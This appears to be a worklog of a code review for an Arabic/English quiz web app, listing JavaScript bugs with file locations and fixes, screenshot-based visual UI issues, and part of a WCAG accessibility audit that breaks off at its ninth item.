# Static Analysis Worklog

## Task 2 — Static Code Analysis (Critical Bugs)

### Methodology
Reviewed 38 modules in `src/app/*.js` (~30k lines), `src/templates/body.html` (3742 lines), and CSS for critical bugs only. Focused on: undefined references, race conditions, unhandled rejections, silent failures, logic bugs, localStorage/IDB issues, DOM access, event handlers, and the IDB load timeout warning.

---

## CRITICAL BUGS FOUND

### 1. [SEVERITY: P0] `exportQuiz()` is referenced in HTML but never defined
- **File**: src/templates/body.html:548
- **Bug**: `<button onclick="exportQuiz()">📤 تصدير</button>` — `exportQuiz` does not exist anywhere in `src/app/*.js` or `window`. Defined functions are `exportData()`, `exportDataZip()`, `exportEncrypted()`.
- **Why critical**: Clicking the "Export" button on the admin dashboard throws `ReferenceError: exportQuiz is not defined`. The user cannot export quiz data from this button — they must find another export path.
- **Fix**: Change `onclick="exportQuiz()"` → `onclick="exportData()"` (or `exportDataZip()`).

### 2. [SEVERITY: P0] Freeze-fix uses wrong state property names — re-render never works
- **File**: src/app/42-freeze-fix.js:107-108
- **Bug**: `if(typeof loadQuestion === 'function' && state.currentTeamIdx != null){ loadQuestion(state.currentCatId, state.currentQIdx, state.currentTeamIdx); }` — `state.currentQIdx` and `state.currentTeamIdx` do not exist on `state`. The actual properties (declared in 09-team-mgmt.js:32, 30-more-i18n.js:183, used everywhere else) are `state.currentQIndex` and `state.currentTeamIndex`.
- **Why critical**: The freeze-fix feature for "re-render question view if it's stale (blank/frozen)" never fires — `state.currentTeamIdx != null` is always `false` (undefined), so the recovery branch is dead. Users see a blank question view after restoring a minimized browser, with no auto-recovery.
- **Fix**: Replace `state.currentQIdx` → `state.currentQIndex` and `state.currentTeamIdx` → `state.currentTeamIndex`.

### 3. [SEVERITY: P0] `applyTheme('default')` / `applyTheme('highcontrast')` reference non-existent themes
- **File**: src/app/13-scoring.js:53,57 + src/app/41-final-enhancements.js:883,895,905
- **Bug**: `initAutoThemeDetection()` calls `applyTheme('default')` for light-mode users and `applyTheme('highcontrast')` for high-contrast users. Neither theme id exists in `THEMES[]` (src/app/05-audio-assets.js:25 — ids are `space`, `cyber`, `gold`, `mermaid`, `aurora`, `mint`, `earth`, `formal`, `occasion`, `mocha`, `light`, `sunrise`, `emerald`, `ruby`, `dark-teal`, `warm-rose`, `custom`). `applyThemeCSS()` silently returns when the theme is not found (line 70: `if(!theme||!theme.vars)return;`), but `applyTheme` first persists `state.settings.theme = 'default'` (an invalid value) via `saveState()`.
- **Why critical**: On first run for users with light system preference (the common case), the persisted theme is the invalid value `'default'`. Subsequent loads also call `applyThemeCSS('default')` (30-more-i18n.js:262) which silently no-ops. The `:root` CSS defaults happen to be the `space` theme so the app appears styled, but the admin theme picker (renderThemeGrid) shows no theme selected, and `data-theme="default"` is set on `<body>` — none of the `[data-theme="light"]` CSS overrides ever fire. The same applies to dark-mode users via `initSystemThemeListener` → `applyThemeSmoothly('default')`.
- **Fix**: Replace `'default'` with `'space'` (the dark default) and `'highcontrast'` with an actual high-contrast theme id, or add these theme ids to `THEMES[]`.

### 4. [SEVERITY: P1] `applyTheme()` unconditionally sets "manually_set" flag, defeating auto-detection listener
- **File**: src/app/13-scoring.js:5,12
- **Bug**: `applyTheme()` always runs `localStorage.setItem('quiz_theme_manually_set','true')` and `localStorage.setItem('quiz-theme-manual','1')` — even when called from `initAutoThemeDetection()` (which is supposed to be automatic, not manual). The system-theme change listener at line 62-66 checks `!localStorage.getItem('quiz_theme_manually_set')`, so after the very first auto-detect call, the listener will never re-apply the system theme.
- **Why critical**: Once the app has done its first-run auto-detect, system theme changes are never followed again for the lifetime of the install. Users who switch OS dark/light mode expect the app to follow.
- **Fix**: Add a `isManual` parameter to `applyTheme(id, isManual=false)` and only set the manual flags when `isManual===true`.

### 5. [SEVERITY: P1] `loadState()` calls bare `saveState()` inside `.then()` — silent failure on throw
- **File**: src/app/11-play-logic.js:519
- **Bug**: Inside `MediaDB.loadAllMedia().then(function(){ ... _idbLoadDone=true; if(_pendingSaveNeeded){_pendingSaveNeeded=false; saveState();} ...})` — `saveState()` is called without try/catch. If it throws synchronously (e.g., `TimerRegistry.setTimeout` fails because TimerRegistry isn't initialized yet, or `_saveStateNow`'s synchronous prefix throws), the rejection propagates to the `.catch(function(){clearTimeout(_loadMediaTimeout);_idbLoadDone=true;...})` on line 523 — which silently swallows it (no logging) because `_pendingSaveNeeded` was already set to `false` on line 519, so the catch's `if(_pendingSaveNeeded)` block is skipped.
- **Why critical**: The pending save that was queued during init (when the user clicked something before IDB finished loading) silently vanishes. The user's edit is lost without any error message.
- **Fix**: Wrap the bare `saveState()` in try/catch: `try{saveState();}catch(e){console.warn('[loadState] pending save failed:',e);}` (matching the pattern used elsewhere in the same file).

### 6. [SEVERITY: P1] `initSystemThemeListener` calls `applyThemeSmoothly` with non-existent theme `'default'`
- **File**: src/app/41-final-enhancements.js:883,895,905
- **Bug**: `detectSystemTheme()` returns `'default'` for dark mode (line 883) and `'light'` for light mode. `initSystemThemeListener` (line 895) and the fallback `mq.addListener` (line 905) both call `applyThemeSmoothly(e.matches ? 'default' : 'light')`. `'default'` is not in `THEMES[]`.
- **Why critical**: When the user's OS theme changes to dark, the listener fires and calls `applyTheme('default')` → `applyThemeCSS('default')` silently returns → CSS variables aren't updated → the page either stays on whatever theme was last set, or falls back to `:root` defaults (space theme). Same root cause as bug #3 but a different code path.
- **Fix**: Replace `'default'` with `'space'` (the actual dark theme id).

### 7. [SEVERITY: P1] `window.fetchExternalLibrary` wrapper crashes if original is undefined
- **File**: src/app/41-final-enhancements.js:269-285
- **Bug**: `const _origFetchExtLib=window.fetchExternalLibrary; window.fetchExternalLibrary=async function(){ await _origFetchExtLib.apply(this,arguments); ... }`. If `window.fetchExternalLibrary` is undefined when 41-final-enhancements.js loads (e.g., 40-features-block.js failed to load or errored), then `_origFetchExtLib` is `undefined`, and `await _origFetchExtLib.apply(...)` throws `TypeError: Cannot read properties of undefined (reading 'apply')`.
- **Why critical**: Clicking the "Fetch" button in the external library import UI throws an uncaught error. The `try/catch` at line 273 only covers the body after `_origFetchExtLib.apply()`, not the call itself.
- **Fix**: Guard with `if(!_origFetchExtLib){toast('Library module not loaded','danger');return;}` before the await, or guard the entire body with try/catch.

### 8. [SEVERITY: P1] History-API hash navigation is dead code — `window.init` is never defined in main window
- **File**: src/app/39-history-aria.js:26-35
- **Bug**: `const _origInit=window.init; if(typeof _origInit==='function'){ window.init=function(){ _origInit.apply(this,arguments); if(window._pendingHashView){ ... } }; }` — `window.init` is never assigned in the main window. The only `function init()` declarations (src/app/36-windows-templates.js:308, 988) are inside template strings used to build the audience/remote window's HTML, so they don't define `window.init` in the main window. The `if(typeof _origInit==='function')` is always false, so the wrap is dead code. `window._pendingHashView` (line 6) is captured but never consumed.
- **Why critical**: Direct-URL navigation to a specific view (e.g., opening `https://quiz.app/#admin`) is broken — the app always starts at the login/wizard view regardless of the URL hash.
- **Fix**: Hook into `_initApp` (in 30-more-i18n.js) or `_showInitialView` instead of trying to wrap the non-existent `window.init`. Or call `showView(window._pendingHashView,true)` from within `_showInitialView` after the wizard/login check.

### 9. [SEVERITY: P1] `_buildRemoteState` reads `state.settings.competitionName` which doesn't exist
- **File**: src/app/36-windows-templates.js:144
- **Bug**: `competitionName:state.settings.competitionName||''` — the actual state field is `state.settings.name` (declared in 09-team-mgmt.js:32 and used everywhere else). `competitionName` is never set anywhere in `src/app/`. Result: `competitionName` is always `''` in the remote/audience payload.
- **Why critical**: Any audience-window UI that displays the competition name from `payload.competitionName` shows blank.
- **Fix**: Change to `state.settings.name||''`.

### 10. [SEVERITY: P1] `showSessionHistory` / `saveSessionHistory` use unguarded `JSON.parse` on localStorage
- **File**: src/app/17-history.js:116, 122
- **Bug**: `let history=JSON.parse(localStorage.getItem('quiz_session_history')||'[]');` and `const history=JSON.parse(localStorage.getItem('quiz_session_history')||'[]');` — no try/catch. If the stored string is malformed (storage corruption, partial write interrupted by browser crash), `JSON.parse` throws SyntaxError and the click handler `showSessionHistory()` (called from `onclick`) crashes with no user feedback.
- **Why critical**: User clicks "Session History" → uncaught SyntaxError → no modal shown, no toast, silent failure (only console error). Same pattern in `saveSessionHistory` (line 116) — if a corrupt string exists, every new save throws and the new session is never recorded.
- **Fix**: Wrap in try/catch returning `[]` on failure: `try{history=JSON.parse(localStorage.getItem('quiz_session_history')||'[]');}catch(e){history=[];}`.

### 11. [SEVERITY: P1] `_saveSoloProgress` swallows non-quota errors with `throw e` but caller doesn't catch
- **File**: src/app/20-display-modes.js:1037-1071
- **Bug**: `_saveSoloProgress()` has `try { saveState(); } catch(e) { if(quota error){...} else { throw e; } }`. The outer function is NOT async-wrapped and doesn't have an outer try/catch. The re-thrown error propagates up to callers (e.g., `playSoloLevel` at line 1388 `_saveSoloProgress();`) which also don't catch.
- **Why critical**: Any non-quota saveState error (e.g., `TimerRegistry.setTimeout` failure, LZString compression failure) bubbles up and crashes the calling function — solo mode would freeze mid-level transition.
- **Fix**: Wrap the re-throw in a try/catch at the top level of `_saveSoloProgress`, or change the else branch to log and continue: `else { console.error('[Solo] save failed:', e); }`.

### 12. [SEVERITY: P1] `_saveStateNow` references `DEFAULT_BG_MUSIC` without `typeof` guard
- **File**: src/app/10-category-mgmt.js:222
- **Bug**: `customMusicData:state.settings.customMusicData===DEFAULT_BG_MUSIC?null:state.settings.customMusicData,` — direct reference to `DEFAULT_BG_MUSIC`. Although `DEFAULT_BG_MUSIC` is declared as `const` in 05-audio-assets.js (loaded before 10-category-mgmt.js), if 05-audio-assets.js fails to load (network error, parse error in the large base64 string), the reference becomes a `ReferenceError` (TDZ for `const`) that crashes `_saveStateNow`.
- **Why critical**: If the audio-assets file fails to load for any reason, every state save crashes — the entire persistence layer breaks. The pattern elsewhere in the codebase (e.g., 30-more-i18n.js:222) uses `typeof DEFAULT_BG_MUSIC!=='undefined'` guards.
- **Fix**: Use `typeof DEFAULT_BG_MUSIC!=='undefined' && state.settings.customMusicData===DEFAULT_BG_MUSIC ? null : state.settings.customMusicData`.

### 13. [SEVERITY: P2] `confirmAction` default parameter `ok=I18n?I18n.t('lbl.confirm'):'تأكيد'` may yield `undefined`
- **File**: src/app/22-features-v7.js:6429
- **Bug**: When called without the 4th argument, `ok` defaults to `I18n.t('lbl.confirm')` (if I18n exists). If the i18n key `lbl.confirm` is missing from the dictionary, `I18n.t` returns `undefined`, so `ok=undefined`. Then line 6432 sets `document.getElementById('confirm-ok-btn').textContent=undefined` → button text becomes the literal string `"undefined"`.
- **Why critical**: Cosmetic but visible — confirmation dialogs show "undefined" on the OK button if the i18n key is missing.
- **Fix**: `ok = (I18n && I18n.t('lbl.confirm')) || 'تأكيد'`.

### 14. [SEVERITY: P2] `_hideIndicator` in SmartSave assigns function reference instead of calling it
- **File**: src/app/38-periodic-cleanup.js:189
- **Bug**: `var el = _getIndicator;` — assigns the function reference to `el` instead of calling `_getIndicator()`. The next lines operate on `_saveIndicator` directly (which works only if previously set). `el` is never used, so this is dead code — but if the intent was to call `_getIndicator()` and operate on the result, the function is broken.
- **Why critical**: Not directly user-facing (the function works using `_saveIndicator` directly), but if `_saveIndicator` was never set (no save has ever been queued), `_saveIndicator.style.opacity='0'` throws TypeError. Currently masked because `_hideIndicator` early-returns at line 188 if `_saveIndicator` is null.
- **Fix**: Either delete the dead `var el = _getIndicator;` line or change to `var el = _getIndicator();` and use `el` consistently.

### 15. [SEVERITY: P2] `_idbLoadDone` safety timeout (3s) can enable saves before media is loaded
- **File**: src/app/30-more-i18n.js:253-259
- **Bug**: The 3-second safety timeout unconditionally sets `_idbLoadDone=true` and logs `[Init] IDB load timeout — saves now enabled`. This is the warning the user asked about. On slow devices or with very large IDB stores, `MediaDB.loadAllMedia()` (called fire-and-forget at 11-play-logic.js:417) legitimately takes 3-8s. The 3s timeout fires first, enabling saves while media is still being loaded into `state.categories[i].catImage`, `q.mediaData`, etc. Any `saveState()` call between 3s and loadAllMedia completion will save the partially-populated state. The media isn't strictly lost (it's still keyed in IDB by id), but the localStorage core snapshot will reflect a state with media=null/true placeholders.
- **Why critical**: Noisy warning on slow devices. The system is largely self-healing (when loadAllMedia completes, the in-memory state is repopulated and the next save captures it correctly), but during the 3-8s window, saves can race with media loading. The 8s inner timeout at 11-play-logic.js:412-416 also fires if loadAllMedia itself hangs, which is the more concerning case.
- **Fix**: Bump the safety timeout to 6-8s (matching the inner loadMedia timeout) and/or log at `info` level instead of `warn` to reduce noise. The real fix is to await loadAllMedia inside `_initApp` instead of fire-and-forget.

### 16. [SEVERITY: P2] `restoreV5Settings` accesses `getElementById('neg-mark-val-wrap').style.display` without null check inside `if(nm)` block
- **File**: src/app/31-settings-panel.js:106,109
- **Bug**: `if(nm){nm.checked=!!s.negativeMarking;document.getElementById('neg-mark-val-wrap').style.display=s.negativeMarking?'flex':'none';}` — if `s-negative-marking` exists but `neg-mark-val-wrap` doesn't, `document.getElementById('neg-mark-val-wrap').style` throws TypeError. Same pattern at line 109 for `streak-val-wrap`. Called from init path (30-more-i18n.js:400 inside `try{restoreV5Settings();}catch(e){...}`) so the throw is caught, but it aborts `restoreV5Settings` partway through — all subsequent settings after the throw (llFifty, streakCount, catCardSize, etc.) are not restored.
- **Why critical**: If any of the dependent wrap elements are missing from body.html (or renamed), the entire settings restore is silently truncated after the first failure.
- **Fix**: Use null-safe access: `const wrap=document.getElementById('neg-mark-val-wrap');if(nm&&wrap){nm.checked=...;wrap.style.display=...}`.

### 17. [SEVERITY: P2] `_origSaveNow` polling at 38-periodic-cleanup.js:242-247 has logic bug — never detects save completion
- **File**: src/app/38-periodic-cleanup.js:242-247
- **Bug**: `TimerRegistry.setInterval(function(){ if(_saveQueued && typeof _saveStateTimer!=='undefined' && !_saveStateTimer){ onSaved(); } }, 600, 'smartSave-poll');` — `_saveStateTimer` is declared with `let` at 10-category-mgmt.js:4 (so `typeof _saveStateTimer!=='undefined'` is always `true`). The intent is to detect when the save debounce timer has cleared (= save completed). But: `saveState()` sets `_saveStateTimer` to a TimerRegistry id, then 500ms later `_saveStateNow` runs, but `_saveStateTimer` is never set back to `null` after the save completes. So `!_saveStateTimer` is `false` for the rest of the session after the first save.
- **Why critical**: The "saved ✓" indicator (SmartSave.onSaved) is only ever shown if no save has happened in the session yet. Once the first save runs, the polling check `!_saveStateTimer` is always false and `onSaved()` never fires again — the indicator stays stuck on "Saving…".
- **Fix**: In `_saveStateNow`, set `_saveStateTimer=null;` after the save completes (in the finally block or at the end). Alternatively, track save completion via a callback rather than polling.

### 18. [SEVERITY: P2] `useLifeline('fifty')` accesses `cat.questions[state.currentQIndex]` without null-checking `cat`
- **File**: src/app/22-features-v7.js:3812-3813
- **Bug**: `const cat=state.categories.find(c=>c.id===state.currentCatId); const q=cat.questions[state.currentQIndex];` — if `state.currentCatId` doesn't match any category (e.g., race condition after category deletion mid-question), `cat` is undefined and `cat.questions` throws TypeError. Called from a user click (50/50 lifeline button).
- **Why critical**: If a category was deleted while a question from it was on screen, clicking 50/50 throws an uncaught error. The lifeline button appears broken with no feedback.
- **Fix**: `if(!cat){toast(I18n.t('toast.catNotFound'),'danger');return;} const q=cat.questions[state.currentQIndex]; if(!q)return;`

### 19. [SEVERITY: P2] `_idbLoadDone` is force-set to `true` from many unrelated code paths — defeats the load-wait guard
- **File**: src/app/17-history.js:74, src/app/24-phase3-a11y-features.js:1531, src/app/18-presentation.js:552,738
- **Bug**: Multiple import paths (importEncrypted, importFromGoogleSheet, importZIP, importJSON) all do `if(!_idbLoadDone){_idbLoadDone=true;_pendingSaveNeeded=false;}` before calling `saveStateSync()`. This was added as a workaround ("V10-fix: Force _idbLoadDone=true so saveStateSync actually saves"). The root cause is that `saveState()` early-returns if `!_idbLoadDone`. The workaround unblocks saves, but it also discards any pending save that was queued during init (`_pendingSaveNeeded=false`).
- **Why critical**: If a user imports data during the initial IDB load window (first 3-8s), the import force-enables saves and clears the pending flag. Any save that was queued (e.g., from another concurrent edit) is silently dropped. Also, this is symptomatic of a fragile init ordering — the flag is being repurposed for two different concerns (init-completion vs. save-permission).
- **Fix**: Decouple "init complete" from "save allowed" — let saves queue during init and flush when init completes, rather than force-flipping the flag from import paths.

---

## Notes on the IDB load timeout warning

The warning `[Init] IDB load timeout — saves now enabled` (src/app/30-more-i18n.js:256) is a **safety net**, not directly a bug. It fires 3s after `_initApp()` starts if `MediaDB.loadAllMedia()` (called fire-and-forget at 11-play-logic.js:417) hasn't completed. The system is largely self-healing: when loadAllMedia eventually completes, it repopulates media in state and the next save captures it correctly. The main concerns are:
1. The 3s threshold is too aggressive for slow devices / large IDB stores — generates noisy warnings during normal operation.
2. During the 3-8s window between the safety timeout firing and loadAllMedia completing, saves can run on partially-populated state (see bug #15 above).
3. The flag is also force-flipped from import paths (bug #19), suggesting the load-wait guard is more of a hindrance than a help.

---

## Non-critical observations (not in scope but worth noting)

- Many `document.getElementById('X').value=Y` patterns in `renderAdmin()` (16-encryption.js:118-176) and `openQuestionModal()` (16-encryption.js:855-946) lack null checks. These work today because body.html defines all referenced elements, but they're fragile to template changes.
- `showView('present')` and `showView('game')` branches in 14-admin-panel.js:306-315 reference `GestureManager`/`presentArea` — but `'present'` and `'game'` are not in `ALL_VIEWS`, so this code is unreachable dead code.
- `_origTimerTick` at 23-mobile-a11y.js:274 is declared `null` and never used — dead code.
- `updateUndoBtn` (22-features-v7.js:4291) reads `state.scoreHistory.length` without checking `state.scoreHistory` exists. Currently safe because `scoreHistory` is initialized to `[]` in state defaults.

---

**Total confirmed critical bugs: 19** (P0: 3, P1: 9, P2: 7)

---

## Task 3 — Visual UI/UX Analysis (VLM Screenshot Review)

### Methodology
Used `z-ai vision` CLI (GLM-4.6V model) to analyze 13 key screenshots across desktop (1280px), mobile (390px), and tablet (768px) viewports. Prompt was Arabic-first, asking only for visual problems (no positives). Findings below are aggregated from the model's per-screenshot responses, filtered to remove obvious model hallucinations (e.g., "RTL broken" claims whose stated reason was actually a word-order nitpick rather than true direction-flip).

**Caveat**: The VLM occasionally mis-identified screen type vs. filename (e.g., labeled some "settings" screenshots as "dashboard"). This could be model error or could indicate that navigation to a view doesn't actually render the expected content — worth verifying in a follow-up pass. The visual issue list is reported as-is from the model regardless of screen-ID confidence.

---

## VISUAL ISSUES FOUND

### Desktop (1280px)

- **desktop-1280__02-intro-launcher.png** (Login) — Subtitle text appears truncated ("أضغط على"); weak contrast on subtitle against background; excessive whitespace between title↔subtitle↔buttons; model flagged a spelling nitpick (hamza on "أضغط" vs "اضغط") — cosmetic.
- **desktop-1280__03-admin-dashboard.png** (Admin Dashboard) — Truncated "إجابات" in stats box; star icon in top nav overlaps with adjacent text; weak contrast on empty-state "لا يوجد مسابقات متاحة" (gray on dark); large empty gaps between upper and lower sections; "ابدأ المسابقة" button overlaps middle sections; menu icon missing in top nav.
- **desktop-1280__05-categories.png** (Categories) — "استيراد ملف" label truncated (right edge missing); import icon overflows its button; weak contrast on "لا يوجد ملفات" empty-state text; large empty gaps between sections; green "إضافة" button overflows its container.
- **desktop-1280__06-teams.png** (Teams) — "الفرق" title appears truncated in section header; weak contrast on center user icon; large gap between section header and main content; "إضافة فريق" button touches container edge (no padding/margin).
- **desktop-1280__11-settings.png** (Settings; model identified as Dashboard) — Truncated "إضافة فريق" in green button; weak contrast on "القائمة" inside blue counter; large empty gaps between sections; green "إضافة فريق" button overflows its bounds; "لا يوجد فريق لعرضه" appears off-screen at bottom; top bar icons crowded/touching.
- **desktop-1280__12-admin-english.png** (English LTR) — Arabic text "الإعدادات" still visible in top nav (untranslated in LTR/English mode); notification bell icon overlaps top nav text; poor contrast (dark text on dark background); large empty gap on right side; top nav buttons overflow; some top nav items missing icons.

### Mobile (390px)

- **mobile-390__02-intro-launcher.png** (Login; model labeled "Settings") — Truncated "إعدادات التطبيق" (word "التطبيق" cut off); weak contrast on subtitle; large gaps between title/subtitle/buttons; "تسجيل الدخول" button oversized relative to screen; lock icon next to login button missing/cut.
- **mobile-390__03-admin-dashboard.png** (Admin Dashboard) — Truncated "الجولات" in top bar; weak contrast on "0" stats numbers (disappear on dark bg); large gaps in top bar; "إضافة مسابقة" button partially cut off horizontally; star icon in top-right corner off-screen; 4 stats cards cramped/unbalanced at 390px.
- **mobile-390__05-categories.png** (Categories) — Search placeholder "ابدأ البحث" truncated; weak contrast on placeholder text; large empty gaps between elements; search icon overflows search-box bounds; font sizes too small at 390px.
- **mobile-390__06-teams.png** (Teams) — Truncated "لأنك لم تشارك في أي فريق بعد" (last word cut); weak contrast on white-on-dark text; large gap between top nav and main content; "إعدادات" icon overflows screen edge; "إضافة فريق" button too large at 390px.
- **mobile-390__11-settings.png** (Settings; model identified as Dashboard) — Truncated "أضف مسابقة" in green button; element overlap among bottom-button icons; weak contrast; large gaps between sections; green button overflows bounds; bottom-button icons overflow screen; cramped dual sections; font too small at 390px.

### Tablet (768px)

- **tablet-768__03-admin-dashboard.png** (Admin Dashboard) — Truncated "الجلسات النشطة" in top toolbar; star icon overflows/overlaps text; weak contrast on "الجلسات النشطة" (light blue on dark); large gaps between top-bar buttons; top-bar AND bottom-bar buttons overflow screen bounds — only partially visible.
- **tablet-768__05-categories.png** (Categories) — Page title "التصنيفات" appears truncated; blue "إضافة" button overlaps search bar (covers part of it); weak contrast on empty-state text; large empty gap between search bar and helper text; bottom-nav icons (القائمة، الإعدادات) overflow screen bounds; title "التصنيفات" left-aligned (should be right-aligned for RTL); "إضافة" button too large at 768px; search bar too narrow / unbalanced.

---

## TOP 5 CRITICAL VISUAL ISSUES (most impactful)

1. **Top/bottom nav-bar buttons overflow screen bounds on tablet (768px) and mobile (390px)** — On tablet dashboard, "الجلسات النشطة" and bottom-nav items (القائمة، الإعدادات) are only partially visible. On mobile, "إضافة مسابقة", "إضافة فريق", and the settings icon all overflow horizontally. **Impact**: Primary navigation/actions become unreachable on the two most common touch form factors. Highest priority.

2. **Recurring truncated Arabic text across desktop/mobile/tablet** — Stats labels ("إجابات", "الجولات"), page titles ("التصنيفات"), button labels ("إضافة فريق", "أضف مسابقة"), subtitle ("أضغط على"), and helper text ("لأنك لم تشارك في أي فريق بعد") are cut off. Suggests fixed-width containers without `text-overflow`/`white-space` handling, or insufficient padding. **Impact**: Loss of meaning in core UI text across all viewports.

3. **Weak contrast on empty-state / placeholder text on dark backgrounds** — Repeats on every screen with an empty state ("لا يوجد ملفات", "لا يوجد فريق لعرضه", "لا يوجد مسابقات متاحة", "ابدأ البحث" placeholder). Likely a CSS variable issue (`--text-muted` or similar is too close to `--bg`). **Impact**: Empty states are exactly when the user needs guidance most, and they're the hardest to read.

4. **English LTR mode shows untranslated Arabic ("الإعدادات") in top nav** — On desktop-1280__12-admin-english.png, the top nav still renders Arabic text despite the app being in English/LTR mode. Either the i18n key is missing for that nav item, or the nav uses hardcoded Arabic strings. **Impact**: i18n/RTL toggle is incomplete — undermines the "optional English" feature.

5. **Buttons overflowing their containers (especially green "إضافة"/"إضافة فريق" CTA buttons)** — On desktop categories, desktop teams/settings, and mobile settings, the green primary action button visibly extends beyond its parent container bounds. Suggests `width: 100%` + extra padding, or fixed pixel widths inside flexible parents. **Impact**: Looks broken/unprofessional on the primary CTA, may also cause click-target overlap with neighbors.

---

## Notes for follow-up
- Recommend a second human pass to verify the screen-ID discrepancies (VLM labeled several "settings" screenshots as "dashboard"). If the screenshots genuinely show the wrong view, that's a separate routing bug; if the VLM is just mis-reading, the visual issues still stand.
- Several "RTL مكسور" claims by the model were filtered out as word-order/spelling nitpicks rather than true direction-flip bugs. Worth a manual check of the genuinely-flagged ones (tablet categories title alignment, English LTR Arabic text).
- Did not modify any files (research-only task per instructions).

---

## Task 9 — WCAG 2.1 AA Accessibility Audit (`9-a11y-audit`)

### Methodology
Audited 38 modules in `src/app/*.js`, `src/templates/body.html` (3743 lines), and 12 CSS files for WCAG 2.1 AA barriers. Examined the dedicated a11y modules `24-phase3-a11y-features.js` (1549 lines), `23-mobile-a11y.js`, and `enhancements.css` accessibility layer. Computed WCAG contrast ratios for all 18 THEMES[] color tokens in `05-audio-assets.js` using the relative-luminance formula `(L1+0.05)/(L2+0.05)`. Research-only — no files modified. Existing positive controls verified: skip link (body.html:5), three aria-live regions (body.html:3-6, 462-463), `*:focus-visible` rule (enhancements.css:921), `prefers-reduced-motion` blocks in 8 CSS files, color-blindness SVG filters (24-phase3:285), `@media(pointer:coarse)` 44px touch-target rule (24-phase3:271), and `openModal`/`closeModal` focus-trap (22-features-v7:6406-6430) all confirmed present and functioning.

---

## ACCESSIBILITY BARRIERS FOUND

### 1. [P0] Wizard setup inputs have no programmatic labels (missing `for=""`)
- **File**: src/templates/body.html:160-285 (25+ `<label>`/`<input>` pairs)
- **Barrier**: Every wizard label uses `<label id="wiz-s3-...-label">` without a `for="wiz-...-input"` attribute, so screen readers don't announce the field name (e.g. "اسم المسابقة", "كلمة المرور", "نقاط الصحة", "حجم الخط", "اللون الأساسي") when the user focuses the input.
- **Who's affected**: screen reader users
- **Fix**: Add `for="<input-id>"` to every `<label>` (or wrap the `<input>` inside its `<label>`), e.g. `<label for="wiz-comp-name" id="wiz-s3-name-label">`.

### 2. [P0] Admin modal forms use bare `<label class="form-label">` without `for=""`
- **File**: src/templates/body.html:3046-3104 (modal-category), 3116+ (modal-question), 3627-3646 (modal-team), 3662-3688 (modal-credit-person)
- **Barrier**: Same pattern as #1 — `<label class="form-label">الاسم</label>` is followed by `<input id="cat-name-input">` with no association. Affects every modal form field (category name/icon/color, question text/options/correct/difficulty/time, team name/color/members, credit person name/role).
- **Who's affected**: screen reader users
- **Fix**: Add `for="<input-id>"` to each `<label class="form-label">`.

### 3. [P0] Clickable `<div>` elements act as buttons but are not keyboard-accessible
- **File**: src/templates/body.html:81-86 (wiz-setup-opt), 106-140 (wiz-mode-card), 298 (wiz-drop-zone), 690-702 (cat-display-mode cards), 773-776 (mode-card), 2943-2978 (solo-wiz-card), 3118-3127 (qtype-tab)
- **Barrier**: All use `onclick="..."` on `<div>` elements with `cursor:pointer` but no `role="button"`, no `tabindex="0"`, and no `onkeydown` handler for Enter/Space. Keyboard-only users cannot activate them (Tab skips them; Enter/Space does nothing). Examples: question-type tabs (نصي/صحة/خطأ/رياضيات), mode selection cards (التناوب/القسم الكامل/الفردي/التدريب), wizard mode/setup cards.
- **Who's affected**: keyboard users
- **Fix**: Convert to `<button>` (preferred) or add `role="button" tabindex="0"` plus an `onkeydown` handler that triggers the action on Enter and Space.

### 4. [P0] Icon-only buttons lack `aria-label` (only `title`)
- **File**: src/templates/body.html:413 (gm-toggle music button), 508 (🎓 training), 509 (📱 QR), 511 (🐛 error log), 513 (↶ undo), 514 (↷ redo), 586 (⛶ expand chart), 1738 (⚙️ advanced search), 2291 (📡 remote), 2292 (🖥 audience)
- **Barrier**: These buttons contain only an emoji/SVG with no text. `title` is not a reliable accessible name (most screen readers ignore it; not exposed in touch UI). Screen readers announce "button" with no name. Note: lines 510 and 2288 correctly use `aria-label` and serve as the in-codebase pattern to follow.
- **Who's affected**: screen reader users
- **Fix**: Add `aria-label="<descriptive-name>"` to each icon-only button (mirror the existing `title` text).

### 5. [P0] All `<div role="dialog">` modals lack accessible names (`aria-labelledby`/`aria-label`)
- **File**: src/templates/body.html:2498 (modal-resume), 2513 (modal-certificate), 3041 (modal-category), 3111 (modal-question), 3623 (modal-team), 3662 (modal-credit-person), 3693 (modal-confirm)
- **Barrier**: Each dialog has a visible `<div class="modal-title" id="...-title">` inside, but the dialog element itself does not reference it via `aria-labelledby` (and has no `aria-label`). Screen readers announce only "dialog" with no name when the modal opens.
- **Who's affected**: screen reader users
- **Fix**: Add `aria-labelledby="<title-id>"` to each `<div role="dialog">` (e.g. `aria-labelledby="cat-modal-title"`).

### 6. [P0] `#crop-modal` is missing `role="dialog"` and `aria-modal="true"`
- **File**: src/templates/body.html:3717
- **Barrier**: `<div id="crop-modal" class="modal-overlay hidden" style="...">` — unlike every other modal in the file, this one has no `role="dialog"` and no `aria-modal="true"`. Screen reader users get no notification that a modal opened, and background content is not semantically inert.
- **Who's affected**: screen reader users
- **Fix**: Add `role="dialog" aria-modal="true" aria-label="قص الصورة"`.

### 7. [P0] Dynamically-created `#modal-bulk-import` lacks dialog semantics, label, and close-button label
- **File**: src/app/24-phase3-a11y-features.js:1099-1100
- **Barrier**: The injected HTML is `<div id="modal-bulk-import" class="modal-overlay hidden">…<button class="modal-close" onclick="closeModal(...)">✕</button>…<textarea id="bulk-import-textarea" placeholder="...">`. No `role="dialog"`, no `aria-modal="true"`, no `aria-labelledby`, the close button has no `aria-label` (just `✕`), and the textarea has no associated `<label>`.
- **Who's affected**: screen reader users
- **Fix**: Add `role="dialog" aria-modal="true" aria-label="استيراد أسئلة مجمّع"` to the overlay; add `aria-label="إغلاق"` to the close button; add a visually-hidden `<label for="bulk-import-textarea">`.

### 8. [P0] Custom overlay dialogs bypass focus-trap / focus-restore
- **File**: src/app/24-phase3-a11y-features.js:789-793 (kb-shortcuts-overlay), 1006-1010 (q-preview-overlay); src/app/23-mobile-a11y.js:138-157 (refresh-confirm-overlay)
- **Barrier**: These overlays are appended directly to `document.body` without calling `openModal()`, so the focus-trap handler from `22-features-v7.js:6413` never runs. Focus is not moved into the overlay on open, Tab can escape to the background, and focus is not restored to the trigger on close. Keyboard users who close the overlay land at `<body>`.
- **Who's affected**: keyboard users, screen reader users
- **Fix**: Call `trapFocus(overlay)` (or `openModal`) when showing, and `releaseFocus()` (or `closeModal`) when hiding; or refactor these to use the standard `.modal-overlay` markup.

### 9. [P1] `--text-muted` fails WCAG AA contrast in 17 of 18 themes — pervasive use (194 occurrences)
- **File**: src/app/05-audio-assets.js:25-58 (THEMES[]); used in 17 source files (194 occurrences)
